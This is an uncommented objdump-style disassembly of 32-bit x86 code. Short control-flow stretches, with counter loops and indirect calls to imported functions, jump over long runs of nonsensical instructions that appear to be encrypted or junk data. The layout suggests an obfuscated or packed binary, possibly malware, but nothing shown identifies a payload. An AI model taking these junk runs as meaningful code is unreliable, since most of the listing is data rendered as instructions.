  4075b2:	call   DWORD PTR ds:0x442374
  4075b8:	cmp    DWORD PTR ds:0x424742,0x18
  4075bf:	jb     0x407591
  4075c5:	mov    esi,0x32729e
  4075ca:	adc    DWORD PTR ds:0x44d418,0x44d40c
  4075d4:	jmp    0x40770b
  4075d9:	adc    dh,al
  4075db:	in     al,0x9d
  4075dd:	data16 jge 0x407635
  4075e0:	mov    ebx,0x5b1ba91b
  4075e5:	xor    al,0x6e
  4075e7:	xchg   esi,eax
  4075e8:	(bad)  
  4075e9:	mov    cl,0x33
  4075eb:	jl     0x407669
  4075ed:	push   es
  4075ee:	jg     0x40766c
  4075f0:	jl     0x407596
  4075f2:	mov    cl,0x63
  4075f4:	mov    al,0xd0
  4075f6:	sbb    esp,DWORD PTR [eax]
  4075f8:	mov    ebx,0xe483408c
  4075fd:	xchg   ecx,eax
  4075fe:	outs   dx,DWORD PTR ds:[esi]
  4075ff:	and    ebp,esp
  407601:	lods   al,BYTE PTR ds:[esi]
  407602:	or     ah,dh
  407604:	out    dx,al
  407605:	push   ebx
  407606:	lea    esp,[edx]
  407608:	test   BYTE PTR [edx+0x14],bh
  40760b:	inc    ecx
  40760c:	ror    esp,cl
  40760e:	imul   DWORD PTR [edx-0x34]
  407611:	or     BYTE PTR [ecx],bl
  407613:	(bad)  
  407614:	pop    ecx
  407615:	and    dh,BYTE PTR [ebx+0x72498123]
  40761b:	mov    ds:0x64a8b404,al
  407620:	shl    BYTE PTR [edx+0x2465b71b],cl
  407626:	lock ret 
  407628:	into   
  407629:	std    
  40762a:	arpl   WORD PTR [esp+eax*8],ax
  40762d:	retf   
  40762e:	cmp    DWORD PTR [esp+esi*8],0x73
  407632:	jnp    0x40761d
  407634:	jo     0x4075e3
  407636:	lods   eax,DWORD PTR ds:[esi]
  407637:	dec    edx
  407638:	rol    BYTE PTR [eax-0x3b440f04],0x8a
  40763f:	call   esi
  407641:	sbb    ecx,DWORD PTR [eax+0x68]
  407644:	ja     0x4076ab
  407646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407647:	push   esi
  407648:	dec    eax
  407649:	dec    esi
  40764a:	iret   
  40764b:	das    
  40764c:	inc    edi
  40764d:	push   esp
  40764e:	mov    esi,0xe5d70959
  407653:	loope  0x407686
  407655:	cmp    eax,0xea401d5e
  40765a:	addr16 pop ebx
  40765c:	shl    WORD PTR [esp+ebx*2-0x476fdd12],cl
  407664:	(bad)  
  407666:	xchg   ebp,eax
  407667:	pop    eax
  407668:	add    bh,BYTE PTR [ebx+0x3f]
  40766b:	leave  
  40766c:	push   0x1
  40766e:	retf   0x6fe8
  407671:	pushf  
  407672:	adc    DWORD PTR [eax+ecx*2+0x13af8fb2],edx
  407679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767a:	hlt    
  40767b:	fcom   DWORD PTR [ecx]
  40767d:	clc    
  40767e:	arpl   WORD PTR [esi-0x79c16b0d],dx
  407684:	jbe    0x40766c
  407686:	or     DWORD PTR [ebx-0x34d3c1f1],ebx
  40768c:	daa    
  40768d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40768e:	jnp    0x407666
  407690:	outs   dx,BYTE PTR ds:[esi]
  407691:	loopne 0x40767f
  407693:	retf   
  407694:	ja     0x407646
  407696:	sub    al,0xdc
  407698:	jg     0x4076f3
  40769a:	dec    edi
  40769b:	mov    ds:0x9fdb1acd,al
  4076a0:	adc    DWORD PTR [ecx+eiz*1+0x237b5cfc],edx
  4076a7:	test   eax,0x4985e584
  4076ac:	jmp    0x40767c
  4076ae:	xor    ch,BYTE PTR [ebx-0x5e]
  4076b1:	and    BYTE PTR [edi],dh
  4076b3:	jl     0x407732
  4076b5:	jnp    0x407679
  4076b7:	jno    0x407678
  4076b9:	shr    BYTE PTR [edx],1
  4076bb:	mov    ds:0x4b34e86d,eax
  4076c0:	jmp    0x40770a
  4076c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c3:	leave  
  4076c4:	shl    esp,cl
  4076c6:	cwde   
  4076c7:	shl    DWORD PTR [edx-0x6cd8fb0a],1
  4076cd:	ret    
  4076ce:	and    ebx,ecx
  4076d0:	add    ch,ch
  4076d2:	sahf   
  4076d3:	push   es
  4076d4:	cli    
  4076d5:	xor    bh,dh
  4076d7:	jae    0x4076f8
  4076d9:	aam    0xe4
  4076db:	sar    BYTE PTR [edx],0xc7
  4076de:	shr    BYTE PTR [edx+0x643a675],1
  4076e4:	and    eax,0xfde0a449
  4076e9:	pop    ecx
  4076ea:	arpl   WORD PTR [edx],bp
  4076ec:	xor    ebp,DWORD PTR [ecx-0x10]
  4076ef:	lock add ebx,ebp
  4076f2:	arpl   WORD PTR ds:0x8685ffd3,ax
  4076f8:	leave  
  4076f9:	mov    esp,0xd4fa46a
  4076fe:	scas   al,BYTE PTR es:[edi]
  4076ff:	cmp    eax,0x9ac11349
  407704:	nop
  407705:	js     0x40777d
  407707:	xchg   ecx,eax
  407708:	test   al,0x3c
  40770a:	pop    esi
  40770b:	xor    ebx,ecx
  40770d:	mov    DWORD PTR ds:0x41075b,0x751d
  407717:	xor    edx,edx
  407719:	add    DWORD PTR ds:0x447980,0xeda
  407723:	add    eax,esi
  407725:	and    DWORD PTR ds:0x447980,0x42473e
  40772f:	add    ebx,esi
  407731:	mov    DWORD PTR ds:0x447988,0x5df4
  40773b:	jmp    0x407872
  407740:	ss push 0x77
  407743:	call   0x6b2de4f3
  407748:	pop    ecx
  407749:	fcom   st(3)
  40774b:	xor    al,0xac
  40774d:	cwde   
  40774e:	pop    ecx
  40774f:	mov    esi,0x7c7c325b
  407754:	push   es
  407755:	jg     0x4077d3
  407757:	jl     0x40777d
  407759:	sub    al,0xde
  40775b:	fwait
  40775c:	xor    edx,eax
  40775e:	push   0x8
  407760:	dec    esp
  407761:	loop   0x407703
  407763:	sbb    ah,bl
  407765:	pop    es
  407766:	pop    esp
  407767:	in     al,0x9e
  407769:	adc    al,0x7d
  40776b:	popa   
  40776c:	xchg   ebp,eax
  40776d:	mov    ebp,0x49f9ff3b
  407772:	pop    esp
  407773:	stos   DWORD PTR es:[edi],eax
  407774:	inc    esi
  407775:	add    ecx,DWORD PTR [esi]
  407777:	inc    ebx
  407778:	sbb    al,0xc6
  40777a:	cs (bad) 
  40777c:	cmp    DWORD PTR [esi+ecx*8-0x448af661],edx
  407783:	cld    
  407784:	ror    BYTE PTR ss:[eax-0x39087808],cl
  40778b:	sub    eax,0x7b5ecff0
  407790:	(bad)  
  407792:	lods   al,BYTE PTR ds:[esi]
  407793:	or     esi,DWORD PTR [edi-0x198568d6]
  407799:	xor    al,0x82
  40779b:	and    ebx,DWORD PTR [eax]
  40779d:	das    
  40779e:	sbb    BYTE PTR [edx],0x9b
  4077a1:	arpl   WORD PTR [eax],bx
  4077a3:	das    
  4077a4:	outs   dx,DWORD PTR ds:[esi]
  4077a5:	push   ebp
  4077a6:	test   esi,ecx
  4077a8:	adc    DWORD PTR [ecx],ebp
  4077aa:	mov    eax,0x573c6cbb
  4077af:	mov    ah,0xac
  4077b1:	das    
  4077b2:	or     esi,edi
  4077b4:	mov    al,ds:0xc3e6bd60
  4077b9:	jge    0x4077fc
  4077bb:	and    ebp,DWORD PTR [ebp+0x336be04]
  4077c1:	xchg   esi,eax
  4077c2:	rcl    ebp,cl
  4077c4:	sbb    ah,BYTE PTR [ecx-0x11]
  4077c7:	out    0x1d,al
  4077c9:	pop    ebx
  4077ca:	push   esp
  4077cb:	xchg   BYTE PTR [edi-0x6f],bl
  4077ce:	xlat   BYTE PTR ds:[ebx]
  4077cf:	xchg   esi,edi
  4077d1:	jge    0x4077e6
  4077d3:	int    0x68
  4077d5:	mov    al,0x63
  4077d7:	sbb    BYTE PTR [eax+eax*1+0x8],al
  4077db:	and    ecx,DWORD PTR [bx-0x55]
  4077df:	ins    BYTE PTR es:[edi],dx
  4077e0:	cmp    al,0x26
  4077e2:	out    dx,al
  4077e3:	push   ebx
  4077e4:	sbb    BYTE PTR [esi+eax*2+0x2f1981f2],ah
  4077eb:	fimul  DWORD PTR [edi+0xaaa61f6]
  4077f1:	mov    eax,0xf2be047a
  4077f6:	repz pop edx
  4077f8:	mov    bl,0xc
  4077fa:	mov    bh,0x2f
  4077fc:	push   ss
  4077fd:	add    ah,BYTE PTR [esi]
  4077ff:	adc    BYTE PTR ds:0xc4a3d3b5,al
  407805:	xor    ebp,DWORD PTR [edi]
  407807:	js     0x40779a
  407809:	mov    bl,BYTE PTR [ebp-0x2cdac0ae]
  40780f:	adc    bh,BYTE PTR [edx]
  407811:	outs   dx,BYTE PTR ds:[esi]
  407812:	dec    edi
  407813:	cmp    esi,ebp
  407815:	mov    eax,0x6a66288a
  40781a:	cld    
  40781b:	pop    es
  40781c:	popf   
  40781d:	xor    edi,DWORD PTR [ebp-0x3]
  407820:	mov    cl,0xec
  407822:	mov    ecx,0x7af55d4c
  407827:	inc    esi
  407828:	into   
  407829:	and    eax,0xa26b84f7
  40782e:	mov    edx,0x7945169a
  407833:	clc    
  407834:	int3   
  407835:	mov    ebx,0xba286994
  40783a:	fst    QWORD PTR [esi+0x52]
  40783d:	scas   al,BYTE PTR es:[edi]
  40783e:	addr16 in al,dx
  407840:	mov    esp,0x8b4d1f59
  407845:	pop    ebx
  407846:	popa   
  407847:	cld    
  407848:	jl     0x407804
  40784a:	inc    esp
  40784b:	and    ch,ah
  40784d:	rcl    ebp,0xb4
  407850:	mov    bh,dh
  407852:	scas   al,BYTE PTR es:[edi]
  407853:	and    al,0xbc
  407855:	mov    al,0xb4
  407857:	loope  0x4078bd
  407859:	jp     0x407874
  40785b:	add    ch,BYTE PTR [edx]
  40785d:	in     eax,0xb
  40785f:	sahf   
  407860:	sbb    eax,0xee2dc01a
  407865:	adc    cl,bh
  407867:	inc    ebx
  407868:	and    eax,0x5d6c34ea
  40786d:	add    al,0xfa
  40786f:	or     esi,ebp
  407871:	jne    0x40786a
  407873:	repz mov edx,DWORD PTR ds:0x42472e
  40787a:	mov    edx,DWORD PTR [ebp-0x20]
  40787d:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  407884:	mov    DWORD PTR ds:0x44a6e8,0x3c9f
  40788e:	cmp    eax,DWORD PTR [edx]
  407890:	je     0x408082
  407896:	mov    edx,DWORD PTR ds:0x410743
  40789c:	and    DWORD PTR ds:0x44d418,edx
  4078a2:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4078a9:	and    DWORD PTR ds:0x424732,0x0
  4078b3:	mov    edx,DWORD PTR ds:0x424732
  4078b9:	inc    edx
  4078ba:	mov    DWORD PTR ds:0x424732,edx
  4078c0:	cmp    DWORD PTR ds:0x424732,0x16
  4078c7:	jne    0x4078f0
  4078cd:	push   DWORD PTR [ebp-0x20]
  4078d0:	push   0x3477
  4078d5:	push   0x4479a0
  4078da:	push   DWORD PTR [ebp-0x10]
  4078dd:	push   0x7aad
  4078e2:	push   0x3f84
  4078e7:	push   DWORD PTR [ebp-0x1c]
  4078ea:	call   DWORD PTR ds:0x442014
  4078f0:	cmp    DWORD PTR ds:0x424732,0x13
  4078f7:	jb     0x4078b3
  4078fd:	lea    eax,[ebp-0xc]
  407900:	mov    DWORD PTR [ebp-0x10],eax
  407903:	xor    edx,edx
  407905:	xor    edx,DWORD PTR ds:0x4444e4
  40790b:	mov    eax,ds:0x4479b8
  407910:	sub    edx,eax
  407912:	xor    edx,DWORD PTR [edx+eax*1]
  407915:	jmp    0x407a4c
  40791a:	lea    eax,[eax+ebx*1]
  40791d:	mov    WORD PTR [ebp+0x1d8d80],ds
  407923:	std    
  407924:	inc    esi
  407925:	nop
  407926:	loope  0x407938
  407928:	add    BYTE PTR [ecx],bl
  40792a:	gs xor eax,0x7f067c7c
  407930:	jl     0x4079ae
  407932:	xor    ebp,DWORD PTR [ecx+0x5]
  407935:	out    0x9b,al
  407937:	lahf   
  407938:	jno    0x407937
  40793a:	add    bh,BYTE PTR [ebx]
  40793c:	icebp  
  40793d:	mov    WORD PTR [esi+0x2c2c9ca7],fs
  407943:	retf   
  407944:	or     DWORD PTR [edi+0x1218ab51],ebx
  40794a:	sbb    al,0xab
  40794c:	and    BYTE PTR [eax-0x693dd247],al
  407952:	inc    ebx
  407953:	and    ch,ah
  407955:	dec    edi
  407956:	xchg   edi,eax
  407957:	pop    DWORD PTR [eax]
  407959:	inc    edx
  40795a:	mov    cl,bl
  40795c:	pushf  
  40795d:	aas    
  40795e:	mov    esp,DWORD PTR [ecx-0x25]
  407961:	retf   
  407962:	or     al,0x62
  407964:	add    ebx,esp
  407966:	pop    esp
  407967:	popf   
  407968:	mov    bh,0x92
  40796a:	js     0x407919
  40796c:	xor    BYTE PTR [ebx+0x2a],dl
  40796f:	inc    eax
  407970:	add    ah,BYTE PTR [esi-0x6e]
  407973:	push   cs
  407974:	not    DWORD PTR [esi+0x134c501e]
  40797a:	cdq    
  40797b:	or     DWORD PTR [esi],edi
  40797d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40797e:	adc    BYTE PTR [esi-0x57],ch
  407981:	hlt    
  407982:	loopne 0x40791d
  407984:	pop    ecx
  407985:	and    eax,0x45842287
  40798a:	and    ebp,DWORD PTR [ebx-0x34bbbdbf]
  407990:	ror    ch,0xdf
  407993:	fdivr  st,st(2)
  407995:	bound  ebp,QWORD PTR [eax+0x41]
  407998:	(bad)  
  407999:	shl    DWORD PTR [ebp+0x34],1
  40799c:	jne    0x4079e8
  40799e:	jns    0x407923
  4079a0:	rcl    DWORD PTR [esi+ebx*4],cl
  4079a3:	jmp    0x2679:0x4b580322
  4079aa:	in     eax,dx
  4079ab:	pop    es
  4079ac:	xchg   ebx,eax
  4079ad:	jmp    0xccd1:0xff51b3b
  4079b4:	dec    ebx
  4079b5:	ret    
  4079b6:	mov    ecx,0x1ca74bc
  4079bb:	pop    ecx
  4079bc:	enter  0x6f12,0x3
  4079c0:	lahf   
  4079c1:	out    0x9a,eax
  4079c3:	xchg   DWORD PTR [ebx-0x794b913e],esp
  4079c9:	js     0x4079c6
  4079cb:	push   eax
  4079cc:	rol    DWORD PTR [edi],1
  4079ce:	(bad)  
  4079cf:	jno    0x4079f0
  4079d1:	mov    dh,BYTE PTR [ebx+0x12]
  4079d4:	dec    ebx
  4079d5:	sub    dh,BYTE PTR [esi-0x15]
  4079d8:	sub    BYTE PTR [esi+0x3],bh
  4079db:	sbb    dl,BYTE PTR [eax-0x5f0d672c]
  4079e1:	and    DWORD PTR ds:0x1bbfc418,0xffffffca
  4079e8:	(bad)  
  4079e9:	rol    DWORD PTR [edi+ebx*2+0x35],cl
  4079ed:	lods   eax,DWORD PTR ds:[esi]
  4079ee:	mov    cl,BYTE PTR [ebp+eax*8-0x5a56c76b]
  4079f5:	jne    0x407992
  4079f7:	sbb    eax,0xdeca1429
  4079fc:	inc    eax
  4079fd:	lock mov dl,BYTE PTR [eax]
  407a00:	mov    al,ds:0xa77b5b06
  407a05:	xchg   edi,eax
  407a06:	xor    ch,BYTE PTR [edx+eax*4]
  407a09:	ficomp WORD PTR [ebp-0x18155a1b]
  407a0f:	inc    eax
  407a10:	pop    esi
  407a11:	bound  esp,QWORD PTR [esi+0x7d]
  407a14:	push   cs
  407a15:	imul   DWORD PTR [ecx-0x53]
  407a18:	mov    esi,0xf795c746
  407a1d:	fcomp  st(2)
  407a1f:	sub    eax,0x9db0036b
  407a24:	hlt    
  407a25:	adc    ah,ch
  407a27:	addr16 pop edi
  407a29:	cmp    eax,0x674ce570
  407a2e:	dec    ebx
  407a2f:	sbb    bl,al
  407a31:	push   0xffffffa9
  407a33:	cmp    al,0xd0
  407a35:	xor    eax,0x17c0af81
  407a3a:	dec    eax
  407a3b:	jns    0x407a18
  407a3d:	sub    al,0x6b
  407a3f:	pop    eax
  407a40:	ins    BYTE PTR es:[edi],dx
  407a41:	cdq    
  407a42:	fs in  eax,dx
  407a44:	out    0xba,al
  407a46:	hlt    
  407a47:	nop
  407a48:	cmp    DWORD PTR [eax+ecx*1],0x19
  407a4c:	mov    eax,DWORD PTR [ebp-0x10]
  407a4f:	mov    DWORD PTR ds:0x447994,0x1e
  407a59:	cmp    DWORD PTR ds:0x447994,0x0
  407a60:	je     0x407aad
  407a66:	cmp    DWORD PTR ds:0x447994,0x10
  407a6d:	jne    0x407a7f
  407a73:	push   DWORD PTR [ebp-0x1c]
  407a76:	push   DWORD PTR [ebp-0x18]
  407a79:	call   DWORD PTR ds:0x442018
  407a7f:	cmp    DWORD PTR ds:0x447994,0x11
  407a86:	jne    0x407a99
  407a8c:	mov    edx,DWORD PTR ds:0x447994
  407a92:	dec    edx
  407a93:	mov    DWORD PTR ds:0x447994,edx
  407a99:	xor    edx,edx
  407a9b:	add    edx,DWORD PTR ds:0x447994
  407aa1:	dec    edx
  407aa2:	mov    DWORD PTR ds:0x447994,edx
  407aa8:	jmp    0x407a59
  407aad:	mov    edx,DWORD PTR [eax]
  407aaf:	imul   edx,edx,0xf89ea9e0
  407ab5:	mov    DWORD PTR [eax],edx
  407ab7:	mov    eax,DWORD PTR [ebp-0xc]
  407aba:	cmp    eax,0x1fe34420
  407abf:	je     0x407c13
  407ac5:	mov    eax,DWORD PTR [ebp-0x1c]
  407ac8:	jmp    0x407bff
  407acd:	(bad)  
  407ace:	fsub   DWORD PTR [edx+0x76]
  407ad1:	jp     0x407a69
  407ad3:	jp     0x407b2d
  407ad5:	mov    ch,0xbf
  407ad7:	xchg   ebp,eax
  407ad8:	fistp  WORD PTR [ecx+ebp*2+0x370f4a69]
  407adf:	jl     0x407b5d
  407ae1:	push   es
  407ae2:	jg     0x407b60
  407ae4:	jl     0x407aac
  407ae6:	inc    ebp
  407ae7:	pop    esp
  407ae8:	adc    DWORD PTR ds:0x82610f98,0xffffffd2
  407aef:	jle    0x407b45
  407af1:	cmp    edx,DWORD PTR [ebp+esi*4-0x67810eae]
  407af8:	dec    ebp
  407af9:	fstp   QWORD PTR [ecx]
  407afb:	mov    ah,0xae
  407afd:	neg    BYTE PTR [esi]
  407aff:	mov    ch,0x57
  407b01:	dec    edx
  407b02:	mov    ebx,0x62bfdef4
  407b07:	xor    dl,al
  407b09:	cwde   
  407b0a:	pop    ebx
  407b0b:	jb     0x407b72
  407b0d:	pushf  
  407b0e:	mov    esi,0xcdbbcb4b
  407b13:	and    al,0x28
  407b15:	xchg   edi,eax
  407b16:	and    eax,0xcca196c0
  407b1b:	ja     0x407b55
  407b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b1e:	dec    esp
  407b1f:	jmp    0x407ab7
  407b21:	pop    ebx
  407b22:	or     bh,ah
  407b24:	adc    ecx,DWORD PTR [ebx+0x46bbcf9b]
  407b2a:	outs   dx,BYTE PTR ds:[esi]
  407b2b:	ss pop esi
  407b2d:	nop
  407b2e:	mov    ds:0xcef72358,al
  407b33:	fisub  DWORD PTR [edx-0x37]
  407b36:	sti    
  407b37:	jo     0x407b4b
  407b39:	mov    ds:0x8a364a68,al
  407b3e:	and    edx,DWORD PTR [edi+0x56]
  407b41:	pop    edx
  407b42:	cmp    DWORD PTR [esi-0x7cd8ebe7],eax
  407b48:	repz test al,0x5
  407b4b:	stc    
  407b4c:	cs pop ebx
  407b4e:	mov    al,0xde
  407b50:	ins    DWORD PTR es:[edi],dx
  407b51:	dec    DWORD PTR [ebx]
  407b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b54:	(bad)  
  407b55:	cmp    DWORD PTR [esi+0x4e5588b],esp
  407b5b:	xchg   ebp,eax
  407b5c:	xchg   esp,eax
  407b5d:	push   ecx
  407b5e:	in     al,dx
  407b5f:	add    cl,ch
  407b61:	push   ebp
  407b62:	imul   edi,DWORD PTR [ebp-0x336b822d],0xffffff85
  407b69:	rcl    DWORD PTR [esi],cl
  407b6b:	mov    ch,ah
  407b6d:	ins    BYTE PTR es:[edi],dx
  407b6e:	sar    DWORD PTR [edx-0x5f],cl
  407b71:	sbb    ebp,DWORD PTR [edi+0x7c530379]
  407b77:	(bad)  
  407b78:	sub    al,0x8f
  407b7a:	arpl   WORD PTR [edx],di
  407b7c:	xchg   edi,eax
  407b7d:	loope  0x407b52
  407b7f:	scas   al,BYTE PTR es:[edi]
  407b80:	je     0x407bef
  407b82:	in     al,dx
  407b83:	jae    0x407be5
  407b85:	jb     0x407b60
  407b87:	mov    ah,0x28
  407b89:	adc    al,ch
  407b8b:	adc    eax,0xb94a622a
  407b90:	push   ecx
  407b91:	xchg   edx,eax
  407b92:	sti    
  407b93:	mov    cs,WORD PTR [edx-0x48]
  407b96:	jmp    0xb9fb:0x4c80655
  407b9d:	push   ecx
  407b9e:	add    edx,esp
  407ba0:	or     ebx,DWORD PTR ds:0xadd38926
  407ba6:	psubb  mm1,mm3
  407ba9:	clc    
  407baa:	jo     0x407b4d
  407bac:	push   0x4f
  407bae:	test   eax,0x4c02db68
  407bb3:	imul   DWORD PTR ds:[edi-0x3c]
  407bb7:	sbb    eax,ebx
  407bb9:	jns    0x407c07
  407bbb:	sbb    ah,0x6
  407bbe:	cs jecxz 0x407bef
  407bc1:	jle    0x407b89
  407bc3:	popa   
  407bc4:	sub    eax,0xb9af869a
  407bc9:	aam    0x8f
  407bcb:	dec    ecx
  407bcc:	adc    dl,BYTE PTR [esi]
  407bce:	mov    eax,0x3f76c58f
  407bd3:	jo     0x407ba7
  407bd5:	shl    BYTE PTR [edi+0x2952b454],cl
  407bdb:	not    DWORD PTR [edx]
  407bdd:	inc    esp
  407bde:	ror    ebp,0xcf
  407be1:	pop    ds
  407be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be3:	mul    dl
  407be5:	add    edx,DWORD PTR ds:0x29ba845c
  407beb:	in     eax,0xa6
  407bed:	push   esp
  407bee:	or     BYTE PTR [edi-0x2d],ch
  407bf1:	jmp    0x2700:0x916201c3
  407bf8:	pop    ds
  407bf9:	add    dh,cl
  407bfb:	fcomp  QWORD PTR [edx+eax*8+0x8]
  407bff:	or     DWORD PTR [eax],0x60751c90
  407c05:	mov    eax,DWORD PTR [ebp-0x8]
  407c08:	xor    eax,ecx
  407c0a:	add    eax,esi
  407c0c:	pop    edi
  407c0d:	pop    esi
  407c0e:	pop    ebx
  407c0f:	leave  
  407c10:	ret    0x4
  407c13:	mov    eax,DWORD PTR [ebp-0xc]
  407c16:	add    eax,DWORD PTR [ebp-0x18]
  407c19:	cmp    eax,0x188271cd
  407c1e:	je     0x407d69
  407c24:	mov    eax,DWORD PTR [ebp-0x10]
  407c27:	and    DWORD PTR [eax],0x751c9d
  407c2d:	jmp    0x407c05
  407c32:	jmp    0x407d69
  407c37:	jnp    0x407be9
  407c39:	lds    edx,FWORD PTR [eax+0x5b7da5fd]
  407c3f:	cmp    ah,BYTE PTR [ebp+0x70]
  407c42:	adc    eax,0x6222f2e8
  407c47:	sub    DWORD PTR [esi],esi
  407c49:	jl     0x407cc7
  407c4b:	push   es
  407c4c:	jg     0x407cca
  407c4e:	jl     0x407be0
  407c50:	sub    BYTE PTR [esi-0x4],0x7b
  407c54:	ficom  WORD PTR [edi]
  407c56:	sub    ebp,ecx
  407c58:	arpl   si,dx
  407c5a:	xor    bl,bh
  407c5c:	adc    al,0x70
  407c5e:	out    dx,al
  407c5f:	jo     0x407cb8
  407c61:	and    BYTE PTR cs:[esi],bh
  407c64:	mov    ds:0x5511ce13,eax
  407c69:	pop    ss
  407c6a:	iret   
  407c6b:	and    dh,BYTE PTR [eax]
  407c6d:	push   es
  407c6e:	push   esp
  407c6f:	scas   al,BYTE PTR es:[edi]
  407c70:	sbb    ah,BYTE PTR [esi+0x1e15ed7]
  407c76:	mov    ah,0x5
  407c78:	popf   
  407c79:	add    DWORD PTR [edx-0x75],0xc6b78a6d
  407c80:	add    ah,ah
  407c82:	push   esi
  407c83:	popf   
  407c84:	mov    ds:0xec63cb4b,eax
  407c89:	in     al,0x27
  407c8b:	popa   
  407c8c:	dec    edi
  407c8d:	add    edx,0xffffffe9
  407c90:	retf   
  407c91:	push   0xf017ef4
  407c96:	jns    0x407c95
  407c98:	cmp    BYTE PTR [ebx+ebp*8-0x6ab3f0e1],al
  407c9f:	stos   BYTE PTR es:[edi],al
  407ca0:	sahf   
  407ca1:	mov    BYTE PTR [eax],0x69
  407ca4:	scas   al,BYTE PTR es:[edi]
  407ca5:	in     al,0xff
  407ca7:	sbb    eax,0x99cc623d
  407cac:	(bad)  
  407cad:	or     BYTE PTR [edx+esi*1+0x6d562e88],cl
  407cb4:	loopne 0x407c67
  407cb6:	jo     0x407d19
  407cb8:	test   eax,0x45951c8a
  407cbd:	pop    eax
  407cbe:	cmp    eax,0x66b2903e
  407cc3:	cmp    ebp,ebx
  407cc5:	jb     0x407cbe
  407cc7:	xchg   edi,eax
  407cc8:	lods   eax,DWORD PTR ds:[esi]
  407cc9:	stos   DWORD PTR es:[edi],eax
  407cca:	mov    eax,ds:0x2ec89223
  407ccf:	xor    al,0x91
  407cd1:	repnz push ecx
  407cd3:	and    al,0xdb
  407cd5:	mov    al,0xd
  407cd7:	pop    esp
  407cd8:	pause  
  407cda:	scas   eax,DWORD PTR es:[edi]
  407cdb:	stos   DWORD PTR es:[edi],eax
  407cdc:	mov    dl,0x5a
  407cde:	jecxz  0x407cdc
  407ce0:	cmc    
  407ce1:	jno    0x407cab
  407ce3:	jp     0x407d17
  407ce5:	mov    ebx,0xe9f7ff2d
  407cea:	dec    esi
  407ceb:	and    ebp,DWORD PTR [ebx+0x2b]
  407cee:	xchg   ebp,eax
  407cef:	call   0x83f2:0x46bbb8c2
  407cf6:	cmp    ah,ah
  407cf8:	call   0x85f32953
  407cfd:	and    BYTE PTR [ebp-0x3f],dh
  407d00:	ss mov bh,0x27
  407d03:	repnz sbb eax,0xae69b751
  407d09:	jmp    0x2877:0x2075fe
  407d10:	mov    edi,0x98557dee
  407d15:	lds    esi,FWORD PTR [ebx+eiz*4+0x2ae1ebc7]
  407d1c:	(bad)  
  407d1d:	or     BYTE PTR [ecx],dl
  407d1f:	(bad)  
  407d20:	jle    0x407cb0
  407d22:	sbb    eax,0xe272e3a7
  407d27:	loopne 0x407d5a
  407d29:	fbld   TBYTE PTR ds:0x6d806851
  407d2f:	lods   al,BYTE PTR ds:[esi]
  407d30:	mov    al,0xf6
  407d33:	sub    al,0x66
  407d35:	hlt    
  407d36:	mov    esp,0x4bcfeaba
  407d3b:	sahf   
  407d3c:	jo     0x407d9f
  407d3e:	ss ja  0x407ceb
  407d41:	push   es
  407d42:	jge    0x407cf9
  407d44:	imul   esp,ebx,0xffffffa5
  407d47:	jb     0x407d0b
  407d49:	sbb    eax,0x28689ab9
  407d4e:	fild   DWORD PTR [edi-0x36]
  407d51:	sbb    al,dl
  407d53:	iret   
  407d54:	mov    esi,0x6a9ff1f6
  407d59:	mov    al,ds:0xd679f9dc
  407d5e:	ss and eax,esi
  407d61:	pop    esp
  407d62:	push   esp
  407d63:	sbb    BYTE PTR [eax+0x1c6f8a54],0x8b
  407d6a:	inc    ebp
  407d6b:	hlt    
  407d6c:	mov    edx,DWORD PTR [ebp-0x18]
  407d6f:	or     eax,edx
  407d71:	cmp    eax,0xffff6dad
  407d76:	je     0x407ec1
  407d7c:	mov    eax,DWORD PTR [ebp-0x10]
  407d7f:	jmp    0x407eb6
  407d84:	push   edi
  407d85:	add    BYTE PTR [esi-0x1b],bh
  407d88:	jge    0x407d6f
  407d8a:	jnp    0x407d26
  407d8c:	and    al,BYTE PTR [ebx-0x572f8a9c]
  407d92:	mov    ah,0xa8
  407d94:	xor    ecx,ecx
  407d96:	jl     0x407e14
  407d98:	push   es
  407d99:	jg     0x407e17
  407d9b:	jl     0x407de5
  407d9d:	dec    ebx
  407d9e:	or     al,0x7d
  407da0:	mov    eax,DWORD PTR [eax]
  407da2:	jne    0x407dc5
  407da4:	inc    edx
  407da5:	and    dl,BYTE PTR [eax+edi*4]
  407da8:	inc    ebp
  407da9:	pop    esp
  407daa:	pop    esp
  407dab:	in     al,0xd5
  407dad:	scas   al,BYTE PTR es:[edi]
  407dae:	or     BYTE PTR [eax+ebx*1-0x13b51388],al
  407db5:	rol    DWORD PTR [esi],cl
  407db7:	mov    ebp,0x53adc9a6
  407dbc:	aad    0xde
  407dbe:	mov    ?,WORD PTR [edi]
  407dc0:	push   esi
  407dc1:	push   ss
  407dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc3:	stos   DWORD PTR es:[edi],eax
  407dc4:	aas    
  407dc5:	and    al,0x1f
  407dc7:	sar    edi,0x93
  407dca:	mov    esi,0x463d90d8
  407dcf:	fidiv  WORD PTR [ecx+0x205f88dd]
  407dd5:	sar    dl,cl
  407dd7:	cld    
  407dd8:	iret   
  407dd9:	or     eax,DWORD PTR [edx]
  407ddb:	inc    ebx
  407ddc:	or     al,ch
  407dde:	fist   DWORD PTR [eax]
  407de0:	aas    
  407de1:	mov    edi,0xcfbe8ff8
  407de6:	ror    BYTE PTR [eax],1
  407de8:	xchg   esi,eax
  407de9:	(bad)  
  407dea:	aad    0x68
  407dec:	imul   esi,DWORD PTR ss:[esi-0x1f71a01a],0xe480e529
  407df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df8:	mov    ebx,0xc420040
  407dfd:	pop    esp
  407dfe:	jnp    0x407dc4
  407e00:	pop    ebx
  407e01:	dec    ecx
  407e02:	ja     0x407e4d
  407e04:	lods   al,BYTE PTR ds:[esi]
  407e05:	mov    WORD PTR [eax],fs
  407e07:	xchg   ecx,eax
  407e08:	push   edx
  407e09:	mov    al,0xd9
  407e0b:	iret   
  407e0c:	jmp    0x9b5bc615
  407e11:	stos   BYTE PTR es:[edi],al
